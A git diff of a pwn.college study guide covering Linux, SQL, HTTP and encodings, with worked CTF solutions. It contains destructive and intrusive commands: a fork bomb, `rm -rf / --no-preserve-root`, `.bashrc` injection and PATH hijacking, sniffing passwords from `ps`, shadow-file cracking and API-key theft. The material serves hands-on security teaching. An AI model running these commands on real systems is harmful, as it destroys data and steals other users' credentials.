@@ -1,8 +1,8 @@
 # 🎓 pwn.college Master Playbook
 
-**A step-by-step learning guide with practice exercises, explanations, and solutions**
+**A complete, step-by-step learning guide with concepts, practice exercises, and solutions for every module**
 
-> How to use this playbook: Read the **Concept**, then try the **Practice** command yourself. Only check the **Solution** if you get stuck. Each module builds on the previous one.
+> **How to use this playbook:** Read the **Concept** section first. Then try the **Practice** exercise yourself. Only open the **Solution** if you get stuck. Every module builds on the previous one.
 
 ---
 
@@ -10,10 +10,10 @@
 
 | Module | Topic | Difficulty |
 |--------|-------|-----------|
-| [Module 1](#-module-1-linux-fundamentals) | Linux Fundamentals | ⭐ Beginner |
+| [Module 1](#-module-1-linux-fundamentals) | Linux Fundamentals (15 sub-modules) | ⭐ Beginner |
 | [Module 2](#-module-2-sql-queries) | SQL Queries | ⭐ Beginner |
 | [Module 3](#-module-3-talking-web) | Talking Web (HTTP) | ⭐⭐ Intermediate |
-| [Module 4](#-module-4-dealing-with-data) | Dealing with Data (Encoding) | ⭐⭐ Intermediate |
+| [Module 4](#-module-4-dealing-with-data) | Dealing with Data (Encodings) | ⭐⭐ Intermediate |
 | [Module 5](#-module-5-web-security) | Web Security | ⭐⭐⭐ Advanced |
 | [Module 6](#-module-6-assembly--systems) | Assembly & Systems | ⭐⭐⭐ Advanced |
 | [Module 7](#-module-7-reverse-engineering) | Reverse Engineering | ⭐⭐⭐⭐ Expert |
@@ -23,30 +23,38 @@
 
 # 🐧 Module 1: Linux Fundamentals
 
+> **The Linux Luminarium** — 108 challenges across 15 sub-modules.
+
 ## 🎯 Learning Goals
-- Navigate the filesystem
-- Read and manipulate files
-- Understand pipes and redirection
-- Work with processes and permissions
+- Navigate the filesystem (absolute vs relative paths)
+- Read, create, move, and delete files
+- Use pipes, redirection, and globbing
+- Manage processes and permissions
+- Understand the PATH variable
+- Exploit misconfigurations (.bashrc, world-writable directories, symlinks)
+- Understand destructive commands (fork bomb, disk exhaustion, `rm -rf /`)
 
 ---
 
 ## 📖 1.1 Pondering Paths
 
-### Concept: Absolute vs Relative Paths
+### Concept: The Filesystem Tree
+
+Linux filesystem starts at `/` (root). Paths can be:
 
 | Path Type | Example | Meaning |
 |-----------|---------|---------|
-| **Absolute** | `/challenge/run` | Starts from `/` (root) |
+| **Absolute** | `/challenge/run` | Starts from root |
 | **Relative** | `./run` | Starts from current directory |
-| **Relative** | `../run` | Goes up one directory first |
+| **Relative (parent)** | `../run` | Goes up one directory first |
+| **Home shortcut** | `~/x` | `~` = `/home/hacker` |
 
-**The three special entries every directory has:**
+**Special directory entries:**
 
 ```
 .    → This directory
 ..   → Parent directory
-~    → Your home directory (/home/hacker)
+~    → Your home directory
 ```
 
 ### 🏋️ Practice 1: Find the directory
@@ -64,7 +72,7 @@ cd /usr/share/zoneinfo/posix/Asia
 
 ### 🏋️ Practice 2: Home directory shortcut
 
-**Task:** `/challenge/run` writes a flag to a file, but requires a short (3-char) path using `~`.
+**Task:** `/challenge/run` writes the flag to a file, but requires a path that uses `~`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -72,7 +80,7 @@ cd /usr/share/zoneinfo/posix/Asia
 ```bash
 /challenge/run ~/a
 ```
-- `~` = `/home/hacker`
+- `~` expands to `/home/hacker`
 - `~/a` = `/home/hacker/a`
 </details>
 
@@ -85,9 +93,9 @@ cd /usr/share/zoneinfo/posix/Asia
 | Command | Purpose | Example |
 |---------|---------|---------|
 | `cat` | Print file contents | `cat /flag` |
-| `ls` | List directory | `ls -la` |
+| `ls -la` | List all files (incl. hidden) | `ls -la /challenge` |
 | `grep` | Search text | `grep pwn.college /file` |
-| `find` | Find files | `find / -name flag` |
+| `find` | Find files | `find / -name flag 2>/dev/null` |
 | `touch` | Create empty file | `touch /tmp/x` |
 | `rm` | Delete file | `rm file` |
 | `mv` | Move/rename | `mv /flag /tmp/` |
@@ -97,7 +105,7 @@ cd /usr/share/zoneinfo/posix/Asia
 
 ### 🏋️ Practice 1: Find the needle
 
-**Task:** Grep a large file for the flag
+**Task:** Grep a large file for the flag.
 
 <details>
 <summary>💡 Solution</summary>
@@ -109,7 +117,7 @@ grep pwn.college /challenge/data.txt
 
 ### 🏋️ Practice 2: Symlink attack
 
-**Task:** Create a symlink at `/home/hacker/not-the-flag` pointing to `/flag`, then run `/challenge/catflag`
+**Task:** Create a symlink at `/home/hacker/not-the-flag` pointing to `/flag`, then run `/challenge/catflag`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -122,7 +130,7 @@ ln -s /flag /home/hacker/not-the-flag
 
 ### 🏋️ Practice 3: Find all flags
 
-**Task:** Search the filesystem for flag files
+**Task:** Search the filesystem for flag files.
 
 <details>
 <summary>💡 Solution</summary>
@@ -148,7 +156,7 @@ find / -name flag 2>/dev/null
 
 ### 🏋️ Practice 1: Bracket globbing
 
-**Task:** Run `/challenge/run file_[bash]` from `/challenge/files`
+**Task:** Run `/challenge/run file_[bash]` from `/challenge/files`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -162,7 +170,7 @@ Matches `file_b`, `file_a`, `file_s`, `file_h`
 
 ### 🏋️ Practice 2: Multiple stars
 
-**Task:** Match all files containing the letter `p`
+**Task:** Match all files containing the letter `p`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -175,7 +183,7 @@ cd /challenge/files
 
 ### 🏋️ Practice 3: Inverted glob
 
-**Task:** Match all files that do NOT start with `p`, `w`, or `n`
+**Task:** Match all files that do NOT start with `p`, `w`, or `n`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -201,9 +209,17 @@ command 2>&1       → Merge stderr into stdout
 command1 | command2 → Pipe stdout to command2
 ```
 
+**File descriptors:**
+
+| FD | Name | Purpose |
+|----|------|---------|
+| 0 | stdin | Input |
+| 1 | stdout | Normal output |
+| 2 | stderr | Error output |
+
 ### 🏋️ Practice 1: Save and search
 
-**Task:** Save `/challenge/run` output to `/tmp/data.txt` and grep for the flag
+**Task:** Save `/challenge/run` output to `/tmp/data.txt` and grep for the flag.
 
 <details>
 <summary>💡 Solution</summary>
@@ -216,7 +232,7 @@ grep pwn.college /tmp/data.txt
 
 ### 🏋️ Practice 2: Grep errors too
 
-**Task:** Filter stderr for the flag
+**Task:** Filter stderr for the flag.
 
 <details>
 <summary>💡 Solution</summary>
@@ -230,7 +246,7 @@ grep pwn.college /tmp/data.txt
 
 ### 🏋️ Practice 3: Sed substitution
 
-**Task:** Remove `FAKEFLAG` from the output
+**Task:** Remove `FAKEFLAG` from the output.
 
 <details>
 <summary>💡 Solution</summary>
@@ -243,7 +259,7 @@ grep pwn.college /tmp/data.txt
 
 ### 🏋️ Practice 4: Tee to a file
 
-**Task:** Capture the stream in a file while piping it onward
+**Task:** Capture the stream in a file while piping it onward.
 
 <details>
 <summary>💡 Solution</summary>
@@ -256,7 +272,7 @@ cat intercepted_data
 
 ### 🏋️ Practice 5: Process substitution
 
-**Task:** Diff two command outputs
+**Task:** Diff two command outputs without creating files.
 
 <details>
 <summary>💡 Solution</summary>
@@ -269,7 +285,7 @@ diff <(/challenge/print_decoys) <(/challenge/print_decoys_and_flag)
 
 ### 🏋️ Practice 6: FIFO (Named Pipe)
 
-**Task:** Create a FIFO and get the flag
+**Task:** Create a FIFO and get the flag.
 
 <details>
 <summary>💡 Solution</summary>
@@ -297,9 +313,13 @@ $(command)          → Command substitution
 read VAR < file     → Read file into variable
 ```
 
+**Key difference:**
+- **Local variable**: Only the current shell sees it.
+- **Exported variable**: Child processes inherit it.
+
 ### 🏋️ Practice 1: Command substitution
 
-**Task:** Capture `/challenge/run` output in a variable
+**Task:** Capture `/challenge/run` output in a variable.
 
 <details>
 <summary>💡 Solution</summary>
@@ -312,7 +332,7 @@ echo $PWN
 
 ### 🏋️ Practice 2: Export vs Local
 
-**Task:** Export `PWN=COLLEGE` and set `COLLEGE=PWN` (local)
+**Task:** Export `PWN=COLLEGE` and set `COLLEGE=PWN` (local).
 
 <details>
 <summary>💡 Solution</summary>
@@ -342,7 +362,7 @@ The challenge sees `PWN` (exported) but not `COLLEGE` (local).
 
 ### 🏋️ Practice 1: Case flip
 
-**Task:** Reverse the case of every letter
+**Task:** Reverse the case of every letter.
 
 <details>
 <summary>💡 Solution</summary>
@@ -354,7 +374,7 @@ The challenge sees `PWN` (exported) but not `COLLEGE` (local).
 
 ### 🏋️ Practice 2: Remove newlines
 
-**Task:** Stitch flag across multiple lines
+**Task:** Stitch flag across multiple lines.
 
 <details>
 <summary>💡 Solution</summary>
@@ -366,7 +386,7 @@ The challenge sees `PWN` (exported) but not `COLLEGE` (local).
 
 ### 🏋️ Practice 3: Extract column
 
-**Task:** Pull flag chars from column 2
+**Task:** Pull flag chars from column 2.
 
 <details>
 <summary>💡 Solution</summary>
@@ -384,8 +404,8 @@ The challenge sees `PWN` (exported) but not `COLLEGE` (local).
 
 | Command | Purpose |
 |---------|---------|
-| `ps -ef` | List all processes |
-| `ps aux` | List all processes (alternative) |
+| `ps -ef` | List all processes (full format) |
+| `ps aux` | List all processes (BSD format) |
 | `kill PID` | Terminate process |
 | `Ctrl+Z` | Suspend (stop) process |
 | `fg` | Resume in foreground |
@@ -407,7 +427,7 @@ ps -ef | grep challenge
 
 ### 🏋️ Practice 2: Kill the blocker
 
-**Task:** Kill `/challenge/dont_run` so `/challenge/run` works
+**Task:** Kill `/challenge/dont_run` so `/challenge/run` works.
 
 <details>
 <summary>💡 Solution</summary>
@@ -415,6 +435,18 @@ ps -ef | grep challenge
 ```bash
 ps -ef | grep dont_run
 kill <PID>
+```
+</details>
+
+### 🏋️ Practice 3: Background process
+
+**Task:** Run a command in the background.
+
+<details>
+<summary>💡 Solution</summary>
+
+```bash
+/challenge/run &
 ```
 </details>
 
@@ -430,14 +462,16 @@ sudo command     → Run command as root
 ```
 
 **Password cracking:**
+
 ```bash
 john /challenge/shadow-leak
 ```
+
 Reveals passwords for system users.
 
 ### 🏋️ Practice 1: Crack the password
 
-**Task:** Crack the shadow file and `su` to `zardus`
+**Task:** Crack the shadow file and `su` to `zardus`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -467,20 +501,20 @@ su zardus
 
 **Numeric permissions:**
 
-| Number | Binary | Symbolic | Meaning |
-|--------|--------|----------|---------|
-| 0 | 000 | `---` | No access |
-| 1 | 001 | `--x` | Execute |
-| 2 | 010 | `-w-` | Write |
-| 3 | 011 | `-wx` | Write + execute |
-| 4 | 100 | `r--` | Read |
-| 5 | 101 | `r-x` | Read + execute |
-| 6 | 110 | `rw-` | Read + write |
-| 7 | 111 | `rwx` | Full access |
+| Number | Symbolic | Meaning |
+|--------|----------|---------|
+| 0 | `---` | No access |
+| 1 | `--x` | Execute |
+| 2 | `-w-` | Write |
+| 3 | `-wx` | Write + execute |
+| 4 | `r--` | Read |
+| 5 | `r-x` | Read + execute |
+| 6 | `rw-` | Read + write |
+| 7 | `rwx` | Full access |
 
 ### 🏋️ Practice 1: Change owner
 
-**Task:** Take ownership of `/flag` and read it
+**Task:** Take ownership of `/flag` and read it.
 
 <details>
 <summary>💡 Solution</summary>
@@ -493,7 +527,7 @@ cat /flag
 
 ### 🏋️ Practice 2: Change permissions
 
-**Task:** Make `/flag` readable by all
+**Task:** Make `/flag` readable by all.
 
 <details>
 <summary>💡 Solution</summary>
@@ -506,7 +540,7 @@ cat /flag
 
 ### 🏋️ Practice 3: SUID bit
 
-**Task:** Make `/challenge/getroot` run as root
+**Task:** Make `/challenge/getroot` run as root.
 
 <details>
 <summary>💡 Solution</summary>
@@ -533,7 +567,7 @@ The `s` in `-rwsr-xr-x` means "run as file owner."
 
 ### 🏋️ Practice 1: Logical AND
 
-**Task:** Run `/challenge/second` only if `/challenge/first-success` succeeds
+**Task:** Run `/challenge/second` only if `/challenge/first-success` succeeds.
 
 <details>
 <summary>💡 Solution</summary>
@@ -545,7 +579,7 @@ The `s` in `-rwsr-xr-x` means "run as file owner."
 
 ### 🏋️ Practice 2: Shell script with shebang
 
-**Task:** Create `solve.sh` with shebang that prints "hack the planet"
+**Task:** Create `solve.sh` with shebang that prints "hack the planet".
 
 <details>
 <summary>💡 Solution</summary>
@@ -562,7 +596,7 @@ chmod a+x solve.sh
 
 ### 🏋️ Practice 3: Script with arguments
 
-**Task:** Print second argument then first argument
+**Task:** Print second argument then first argument.
 
 <details>
 <summary>💡 Solution</summary>
@@ -580,7 +614,7 @@ chmod a+x solve.sh
 
 ### 🏋️ Practice 4: Conditional script
 
-**Task:** Print "college" if `$1` is "pwn"
+**Task:** Print "college" if `$1` is "pwn".
 
 <details>
 <summary>💡 Solution</summary>
@@ -600,7 +634,71 @@ chmod a+x solve.sh
 
 ---
 
-## 📖 1.11 Pondering PATH
+## 📖 1.11 Terminal Multiplexing (screen / tmux)
+
+### Concept: Persistent Sessions
+
+Terminal multiplexers let you:
+- Run multiple shells in one window
+- **Detach** from a session and **reattach** later (survives SSH disconnects)
+
+| Action | `screen` | `tmux` |
+|--------|----------|--------|
+| Start | `screen` | `tmux` |
+| Detach | `Ctrl-a` then `d` | `Ctrl-b` then `d` |
+| List sessions | `screen -ls` | `tmux ls` |
+| Reattach | `screen -r` | `tmux attach` (or `tmux a`) |
+| New window | `Ctrl-a c` | `Ctrl-b c` |
+| Next window | `Ctrl-a n` | `Ctrl-b n` |
+| Previous window | `Ctrl-a p` | `Ctrl-b p` |
+| Jump to window N | `Ctrl-a N` | `Ctrl-b N` |
+| Window picker | `Ctrl-a "` | `Ctrl-b w` |
+
+### 🏋️ Practice 1: Detach and reattach
+
+**Task:** Start `screen`, detach, run `/challenge/run`, then reattach to claim the flag.
+
+<details>
+<summary>💡 Solution</summary>
+
+```bash
+screen
+# Press Ctrl-a, then d
+/challenge/run
+screen -r
+```
+</details>
+
+### 🏋️ Practice 2: Find the right session
+
+**Task:** List sessions, attach to each until you find the flag.
+
+<details>
+<summary>💡 Solution</summary>
+
+```bash
+screen -ls
+screen -r <session_name>
+# If no flag, Ctrl-a d and try the next session
+```
+</details>
+
+### 🏋️ Practice 3: Switch windows (tmux)
+
+**Task:** The flag is in Window 0. Switch to it.
+
+<details>
+<summary>💡 Solution</summary>
+
+```bash
+tmux a
+# Press Ctrl-b, then 0
+```
+</details>
+
+---
+
+## 📖 1.12 Pondering PATH
 
 ### Concept: The PATH Variable
 
@@ -612,9 +710,11 @@ PATH=/usr/bin:/bin:/usr/local/bin
 
 When you type `ls`, the shell searches each directory in order.
 
+**PATH Hijacking**: If you can place a fake command earlier in `PATH`, the shell runs your version instead of the real one.
+
 ### 🏋️ Practice 1: Empty PATH
 
-**Task:** Prevent `/challenge/run` from calling `rm`
+**Task:** Prevent `/challenge/run` from calling `rm`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -628,7 +728,7 @@ The shell can't find `rm`, so it fails and gives you the flag.
 
 ### 🏋️ Practice 2: Set PATH to a directory
 
-**Task:** Point PATH to `/challenge/more_commands` so `win` is found
+**Task:** Point PATH to `/challenge/more_commands` so `win` is found.
 
 <details>
 <summary>💡 Solution</summary>
@@ -641,7 +741,7 @@ PATH=/challenge/more_commands/
 
 ### 🏋️ Practice 3: Hijack a command
 
-**Task:** Create a fake `rm` that prints the flag instead
+**Task:** Create a fake `rm` that prints the flag instead.
 
 <details>
 <summary>💡 Solution</summary>
@@ -656,15 +756,17 @@ PATH=/home/hacker
 
 ---
 
-## 📖 1.12 Shenanigans (Persistence Attacks)
+## 📖 1.13 Shenanigans (Persistence & Sniffing Attacks)
 
-### Concept: `.bashrc` Hijacking
+> These challenges exploit misconfigured permissions and process visibility to steal information.
 
-`.bashrc` runs automatically when a user opens a shell. If writable, you can inject commands that run as the victim.
+### 1.13.1 `.bashrc` Hijacking
 
-### 🏋️ Practice 1: Inject into `.bashrc`
+**Concept:** `.bashrc` runs automatically when a user opens a shell. If writable, you can inject commands that run as the victim.
 
-**Task:** Make `zardus` print the flag
+#### 🏋️ Practice: Inject into `.bashrc`
+
+**Task:** Make `zardus` print the flag.
 
 <details>
 <summary>💡 Solution</summary>
@@ -675,15 +777,19 @@ echo "cat /flag" >> /home/zardus/.bashrc
 ```
 </details>
 
-### 🏋️ Practice 2: Hijack `flag_checker`
+### 1.13.2 Sniffing Inputs
 
-**Task:** Steal the flag Zardus types into `flag_checker`
+**Concept:** Zardus runs a command (`flag_checker`) and types the flag into it. You can hijack the command name so your fake version receives the input.
+
+#### 🏋️ Practice: Hijack `flag_checker`
+
+**Task:** Create a fake `flag_checker` that captures what Zardus types.
 
 <details>
 <summary>💡 Solution</summary>
 
 ```bash
-# Create fake checker
+# Step 1: Create fake checker
 cat > /home/hacker/flag_checker << 'EOF'
 #!/bin/bash
 echo "Type the flag"
@@ -692,9 +798,197 @@ echo "You entered: $FLAG"
 EOF
 chmod +x /home/hacker/flag_checker
 
-# Hijack PATH
+# Step 2: Hijack PATH in Zardus's bashrc
 echo 'export PATH=/home/hacker:$PATH' >> /home/zardus/.bashrc
+
+# Step 3: Trigger victim
 /challenge/victim
+```
+</details>
+
+### 1.13.3 Overshared Directories
+
+**Concept:** A world-writable directory lets you **delete and replace** files you don't own. You can replace the victim's `.bashrc` with your own malicious version.
+
+#### 🏋️ Practice: Replace `.bashrc`
+
+**Task:** Replace `/home/zardus/.bashrc` with a malicious one.
+
+<details>
+<summary>💡 Solution</summary>
+
+```bash
+# Create malicious bashrc locally
+cat > /home/hacker/.bashrc << 'EOF'
+echo "Type the flag"
+read FLAG
+echo "Captured: $FLAG"
+EOF
+
+# Replace Zardus's bashrc
+rm /home/zardus/.bashrc
+cp /home/hacker/.bashrc /home/zardus/.bashrc
+
+# Trigger victim
+/challenge/victim
+```
+</details>
+
+### 1.13.4 Tricky Linking (Symlink Attack)
+
+**Concept:** If you can write to a directory, you can delete a file and replace it with a **symlink** to a sensitive file. When the victim writes to the symlink, the kernel writes to the target using the victim's privileges.
+
+#### 🏋️ Practice: Symlink attack
+
+**Task:** Replace a file the victim writes to with a symlink to Zardus's `.bashrc`.
+
+<details>
+<summary>💡 Solution</summary>
+
+```bash
+# Replace the file with a symlink
+rm /tmp/collab/evil-commands.txt
+ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
+
+# First run: injects "cat /flag" into Zardus's bashrc
+/challenge/victim
+
+# Second run: executes the injected command
+/challenge/victim
+```
+</details>
+
+### 1.13.5 Sniffing Process Arguments
+
+**Concept:** Linux process lists are public. If a user runs a command with a password as an argument, anyone can see it with `ps aux`.
+
+#### 🏋️ Practice: Catch the password
+
+**Task:** Monitor `ps aux` to catch Zardus's password, then `su` to him.
+
+<details>
+<summary>💡 Solution</summary>
+
+```bash
+# Monitor processes in a loop
+while true; do ps aux | grep zardus | grep -v grep; sleep 0.1; done
+
+# When you see the password in the output, use it
+su zardus
+sudo cat /flag
+```
+</details>
+
+### 1.13.6 Snooping on Configurations
+
+**Concept:** Many config files are world-readable (`-rw-r--r--`). Secrets like API keys are often stored in `.bashrc` or `.profile`.
+
+#### 🏋️ Practice: Steal the API key
+
+**Task:** Read Zardus's `.bashrc` to find `FLAG_GETTER_API_KEY`, then use it.
+
+<details>
+<summary>💡 Solution</summary>
+
+```bash
+cat /home/zardus/.bashrc
+# Look for: FLAG_GETTER_API_KEY=sk-...
+
+flag_getter --key sk-1965714851
+```
+</details>
+
+---
+
+## 📖 1.14 Daring Destruction
+
+> **Warning:** These commands can destroy your environment. They are recoverable on pwn.college by restarting the container.
+
+### 1.14.1 The Fork Bomb
+
+**Concept:** A fork bomb creates processes faster than the kernel can handle, filling the process table and freezing the system.
+
+**Key ingredients:**
+- `fork()` (implicit in launching a process)
+- Backgrounding (`&`) to avoid waiting for children
+- Self-reference (script calls itself)
+
+#### 🏋️ Practice: Fork bomb
+
+**Task:** Create a fork bomb script and detonate it.
+
+<details>
+<summary>💡 Solution</summary>
+
+```bash
+# Step 1: Start the checker in a separate terminal
+/challenge/check
+
+# Step 2: Create the bomb script
+cat > bomb.sh << 'EOF'
+#!/bin/bash
+./bomb.sh & ./bomb.sh &
+EOF
+chmod +x bomb.sh
+
+# Step 3: Detonate
+./bomb.sh
+```
+The checker gives you the flag when it can't spawn new processes.
+</details>
+
+### 1.14.2 Disk-Space Doomsday
+
+**Concept:** Fill the 1 GB home directory quota so no new files can be created.
+
+**The `yes` command:** Outputs `y` forever. Redirect it to a file to fill the disk.
+
+#### 🏋️ Practice: Fill the disk
+
+**Task:** Fill the disk, run the checker, then clean up and run it again.
+
+<details>
+<summary>💡 Solution</summary>
+
+```bash
+# Stage 1: Fill the disk
+yes > big_junk_file
+# Wait until you see: "No space left on device"
+
+# Run first check
+/challenge/check
+
+# Stage 2: Clean up
+rm big_junk_file
+
+# Run second check for the flag
+/challenge/check
+```
+</details>
+
+### 1.14.3 `rm -rf /` (The Nuclear Option)
+
+**Concept:** Deletes everything on the filesystem. Requires `--no-preserve-root` on modern systems.
+
+**Life after `rm -rf /`:** Bash is already loaded in RAM, so **built-in commands** (`read`, `echo`) still work, even though external programs (`cat`, `ls`) are gone.
+
+#### 🏋️ Practice: Survive `rm -rf /`
+
+**Task:** Delete everything, then read `/flag` using only shell built-ins.
+
+<details>
+<summary>💡 Solution</summary>
+
+```bash
+# In one terminal, start the checker
+/challenge/check
+
+# In another terminal, wipe the system
+rm -rf / --no-preserve-root
+
+# Use built-in `read` instead of `cat`
+read -r FLAG < /flag
+echo $FLAG
 ```
 </details>
 
@@ -705,14 +999,12 @@ echo 'export PATH=/home/hacker:$PATH' >> /home/zardus/.bashrc
 ## 🎯 Learning Goals
 - Write SELECT statements
 - Filter with WHERE
-- Use SUBSTR and LIMIT
-- Query sqlite_master
+- Use SUBSTR, LENGTH, LIMIT
+- Query `sqlite_master`
 
 ---
 
 ## 📖 2.1 Basic SELECT
-
-### Concept
 
 ```sql
 SELECT column FROM table;
@@ -736,12 +1028,6 @@ SELECT * FROM assets;
 
 ## 📖 2.2 WHERE Clause
 
-### Concept
-
-```sql
-SELECT column FROM table WHERE condition;
-```
-
 | Operator | Meaning |
 |----------|---------|
 | `=` | Equal |
@@ -752,7 +1038,7 @@ SELECT column FROM table WHERE condition;
 
 ### 🏋️ Practice 1: Find the flag by tag
 
-**Task:** The flag is in `details` where `flag_tag = 1337`
+**Task:** The flag is in `details` where `flag_tag = 1337`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -764,7 +1050,7 @@ SELECT secret FROM details WHERE flag_tag = 1337;
 
 ### 🏋️ Practice 2: Exclusionary filter
 
-**Task:** Get the flag where `flag_tag != 1`
+**Task:** Get the flag where `flag_tag != 1`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -776,7 +1062,7 @@ SELECT flag FROM flags WHERE flag_tag != 1;
 
 ### 🏋️ Practice 3: Filter strings
 
-**Task:** Get the secret where `flag_tag = 'yep'`
+**Task:** Get the secret where `flag_tag = 'yep'`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -790,8 +1076,6 @@ SELECT secret FROM data WHERE flag_tag = 'yep';
 
 ## 📖 2.3 Functions: SUBSTR, LENGTH, LIMIT
 
-### Concept
-
 ```sql
 SUBSTR(string, start, length)    -- Extract substring (1-indexed)
 LENGTH(string)                    -- String length
@@ -800,7 +1084,7 @@ LIMIT n                           -- Only n rows
 
 ### 🏋️ Practice 1: Extract first character
 
-**Task:** Get the first char of `record` where it starts with `p`
+**Task:** Get the first char of `record` where it starts with `p`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -812,7 +1096,7 @@ SELECT SUBSTR(record, 1, 1) FROM fragments WHERE SUBSTR(record, 1, 1) = 'p';
 
 ### 🏋️ Practice 2: Extract in chunks
 
-**Task:** Extract the flag from `archive` in 4-byte chunks
+**Task:** Extract the flag from `archive` in 4-byte chunks.
 
 <details>
 <summary>💡 Solution</summary>
@@ -829,9 +1113,7 @@ SELECT SUBSTR(value, 9, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
 
 ## 📖 2.4 Querying Metadata
 
-### Concept
-
-SQLite stores table info in `sqlite_master`.
+SQLite stores table info in `sqlite_master`:
 
 ```sql
 SELECT tbl_name FROM sqlite_master WHERE type='table';
@@ -839,8 +1121,6 @@ SELECT sql FROM sqlite_master WHERE type='table' AND name='users';
 ```
 
 ### 🏋️ Practice 1: Find hidden table
-
-**Task:** Find the table name, then query it
 
 <details>
 <summary>💡 Solution</summary>
@@ -863,14 +1143,13 @@ SELECT detail FROM usMSjFGn;   -- use actual name from step 1
 - Use curl, netcat, python requests
 - Manipulate headers (User-Agent, Host, Cookie)
 - Handle redirects, forms, cookies
+- Write JavaScript for browser-based challenges
 
 ---
 
-## 📖 3.1 Your First HTTP Request
+## 📖 3.1 HTTP Basics
 
-### Concept: HTTP Basics
-
-An HTTP request looks like:
+An HTTP request:
 
 ```
 GET /path HTTP/1.1
@@ -882,7 +1161,7 @@ Cookie: session=abc
 body (for POST)
 ```
 
-An HTTP response looks like:
+An HTTP response:
 
 ```
 HTTP/1.1 200 OK
@@ -896,7 +1175,7 @@ Content-Length: 123
 
 ### 🏋️ Practice 1: Set User-Agent
 
-**Task:** Request the flag with `User-Agent: Firefox`
+**Task:** Request the flag with `User-Agent: Firefox`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -908,7 +1187,7 @@ curl --user-agent "Firefox" http://challenge.localhost:80/pwn
 
 ### 🏋️ Practice 2: Use netcat
 
-**Task:** Send a raw HTTP request with netcat
+**Task:** Send a raw HTTP request with netcat.
 
 <details>
 <summary>💡 Solution</summary>
@@ -919,8 +1198,6 @@ echo -ne "GET / HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" | nc challenge
 </details>
 
 ### 🏋️ Practice 3: Use Python requests
-
-**Task:** Send a GET request
 
 <details>
 <summary>💡 Solution</summary>
@@ -936,8 +1213,6 @@ print(r.text)
 
 ## 📖 3.2 HTTP Headers
 
-### Concept: Common Headers
-
 | Header | Purpose |
 |--------|---------|
 | `User-Agent` | Browser/client identity |
@@ -949,8 +1224,6 @@ print(r.text)
 
 ### 🏋️ Practice 1: Set Host header
 
-**Task:** Set `Host: challenge.localhost`
-
 <details>
 <summary>💡 Solution</summary>
 
@@ -959,23 +1232,9 @@ curl --header "Host: challenge.localhost" http://challenge.localhost
 ```
 </details>
 
-### 🏋️ Practice 2: Set Host with netcat
-
-<details>
-<summary>💡 Solution</summary>
-
-```bash
-echo -ne "GET / HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" | nc challenge.localhost 80
-```
-</details>
-
 ---
 
 ## 📖 3.3 URL Encoding
-
-### Concept
-
-Special characters must be URL-encoded:
 
 | Char | Encoding |
 |------|----------|
@@ -987,7 +1246,7 @@ Special characters must be URL-encoded:
 
 ### 🏋️ Practice 1: Encode spaces
 
-**Task:** Request `/hack the planet`
+**Task:** Request `/hack the planet`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1000,8 +1259,6 @@ echo -ne "GET /hack%20the%20planet HTTP/1.1\r\nHost: challenge.localhost:80\r\n\
 ---
 
 ## 📖 3.4 GET Parameters
-
-### Concept
 
 ```
 http://host/path?key1=value1&key2=value2
@@ -1030,10 +1287,6 @@ curl "http://challenge.localhost:80/path?param1=value1&param2=value2"
 ---
 
 ## 📖 3.5 HTTP Forms (POST)
-
-### Concept
-
-POST requests send data in the body:
 
 ```
 POST /endpoint HTTP/1.1
@@ -1082,16 +1335,12 @@ print(r.text)
 
 ## 📖 3.6 HTTP Redirects
 
-### Concept
-
 A redirect returns:
 
 ```
 HTTP/1.1 302 FOUND
 Location: /new-path
 ```
-
-You must follow the `Location` header.
 
 ### 🏋️ Practice 1: Follow redirect with curl
 
@@ -1122,14 +1371,14 @@ curl http://challenge.localhost:80/wbcYrxAh-fulfill
 
 ## 📖 3.7 HTTP Cookies
 
-### Concept
-
 Server sets cookie:
+
 ```
 Set-Cookie: session=abc123; Path=/
 ```
 
 Client sends cookie:
+
 ```
 Cookie: session=abc123
 ```
@@ -1166,13 +1415,11 @@ echo -ne "GET / HTTP/1.1\r\nHost: localhost:80\r\nCookie: cookie_name=cookie_val
 
 ## 📖 3.8 JavaScript (Browser Context)
 
-### Concept
-
 When the challenge asks for `.html` files, you write JavaScript.
 
 ### 🏋️ Practice 1: Redirect
 
-**Task:** Create `solve.html` that redirects to `/fulfill`
+**Task:** Create `solve.html` that redirects to `/fulfill`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1229,15 +1476,14 @@ fetch('http://challenge.localhost:80/hack', {
 # 🔢 Module 4: Dealing with Data (Encodings)
 
 ## 🎯 Learning Goals
+- Read Python programs that check input
 - Understand hex, binary, base64
 - Handle nested encodings
-- Read Python programs
+- Work with UTF-8 / UTF-16
 
 ---
 
 ## 📖 4.1 Reading the Program
-
-### Concept
 
 Most challenges give you a Python program that checks your input. Read it:
 
@@ -1264,8 +1510,6 @@ echo -n "the_password" | /challenge/runme
 
 ## 📖 4.2 Hex Encoding
 
-### Concept
-
 Hex bytes are written as `\xNN`:
 - `\x41` = `A`
 - `\x0a` = newline
@@ -1278,7 +1522,7 @@ b'ABC'.hex()               # '414243'
 
 ### 🏋️ Practice 1: Hex input
 
-**Task:** Program expects `bytes.fromhex()` of your input to equal `b'\x98\xd3...'`
+**Task:** Program expects `bytes.fromhex()` of your input to equal `b'\x98\xd3...'`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1290,7 +1534,7 @@ echo -n "98d3d0b2cee1eeab" | /challenge/runme
 
 ### 🏋️ Practice 2: Encoding with `\x`
 
-**Task:** Input needs to be raw bytes `\x83\x32...`
+**Task:** Input needs to be raw bytes `\x83\x32...`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1303,7 +1547,7 @@ echo -e -n "\x832\xdb\xc4\xc5\xd0\xaa\x8a" | /challenge/runme
 
